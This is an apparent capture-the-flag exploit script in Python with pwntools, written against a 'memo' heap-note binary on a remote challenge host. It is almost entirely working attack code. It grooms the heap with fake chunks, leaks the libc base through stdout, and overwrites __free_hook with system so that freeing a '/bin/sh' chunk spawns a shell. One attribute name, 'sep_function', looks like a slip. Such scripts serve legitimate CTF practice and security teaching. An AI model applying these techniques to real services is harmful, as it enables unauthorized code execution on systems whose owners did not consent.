#!/usr/bin/env python
from inv_memo import *

bin_file = './memo'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challenge', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so')
env.set_item('offset_key', debug = 0x612000, local = 0x617000, remote = 0x617000)
env.select('remote')

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stdout          = libc.symbols['_IO_2_1_stdout_']
offset_libc_free_hook       = libc.symbols['__free_hook']
offset_libc_io_stdfile_lock = offset_libc_free_hook - 0x28

offset_key                  = env.offset_key

#==========

def attack(conn, **kwargs):
    fake_chunk = [0]*8
    fake_chunk[0] = 0xfffffffffffffff0
    fake_chunk[1] = 0x10;
    fake_chunk[3] = 0x21;
    fake_chunk[7] = 0x21;

    iv = InvisibleMemo(conn, ''.join(map(p64, fake_chunk))[:-1], -1)
    iv.newkey(''.join(map(p64, fake_chunk))[:0x20])

    for _ in range(7):
        iv.add(0x18, None, 0x100)
    for _ in range(7):
        iv.add(0x48, None, 0x100)
    for _ in range(7):
        iv.add(0x88, None, 0x100)

    for _ in range(2):
        iv.add(0xa00000, None, 0xffffff)

    fast  = iv.add(0x18, 'a'*4)
    small = iv.add(0x88, 'b'*4)

    iv.delete(2, -1)
    iv.delete(fast)

    fake_chunk[7] = 0x1;
    iv.newkey(''.join(map(p64, fake_chunk))[:-1])

    iv.delete(small)

    fake_chunk[3] = 0xa00001;
    iv.newkey(''.join(map(p64, fake_chunk))[:0x20])
    iv.add(0xa00000, None, 0xffffff)

    fake_chunk[3] = 0xfffffffffffffff1;
    iv.newkey(''.join(map(p64, fake_chunk))[:0x20])

    iv.add((offset_libc_stdout-0x20) - (offset_key+0x10) - 0x20, None)
    iv.key = p64((offset_key+0x10) - (offset_libc_stdout-0x20)).rstrip('\x00')
    iv.add((offset_libc_free_hook+0x10) - (offset_libc_stdout-0x20) - 0x20, '\xff', 0x48, True)

    conn.recv(5)
    addr_libc_io_stdfile_lock = u64(conn.recv(8))
    libc.address = addr_libc_io_stdfile_lock - offset_libc_io_stdfile_lock
    if libc.address & 0xfff:
        raise
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_free_hook = libc.symbols['__free_hook']

    iv.key = p64((offset_key+0x10) - (offset_libc_free_hook - 0x8)).rstrip('\x00')
    sh = iv.add(0x18, '/bin/sh\x00' + p64(addr_libc_system))
    iv.delete(sh)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    if env.check('remote'):
        comn.connection.sendline('/send_flag')
    else:
        comn.connection.interactive()

#==========
